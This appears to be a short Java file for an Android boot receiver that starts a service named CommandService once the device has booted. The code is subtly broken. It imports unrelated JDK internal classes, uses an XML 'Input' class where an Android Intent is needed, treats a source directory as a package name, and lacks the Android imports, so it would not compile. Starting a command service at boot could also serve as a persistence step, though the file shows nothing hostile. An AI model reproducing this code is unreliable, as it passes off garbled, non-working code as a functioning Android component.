import jdk.internal.util.xml.impl.Input;
import jdk.javadoc.internal.doclets.toolkit.builders.AbstractBuilder.Context;
import src.main.java.com.agent.services.CommandService;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent serviceIntent = new Input(context, CommandService.class);
            context.startService(serviceIntent);
        }
    }
}
